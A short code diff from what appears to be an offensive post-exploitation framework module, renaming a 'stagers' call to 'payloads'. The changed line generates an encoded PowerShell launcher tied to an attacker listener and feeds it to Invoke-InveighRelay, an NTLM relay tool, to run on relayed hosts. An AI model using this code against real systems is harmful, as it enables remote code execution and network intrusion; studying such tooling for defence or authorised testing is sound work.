@@ -176,7 +176,7 @@ class Module:
             else:
 
                 # generate the PowerShell one-liner with all of the proper options set
-                command = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                command = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
         # set defaults for invader
         scriptEnd = "\n" + 'Invoke-InveighRelay -Tool "2" -Command \"%s\"' % (command)
 
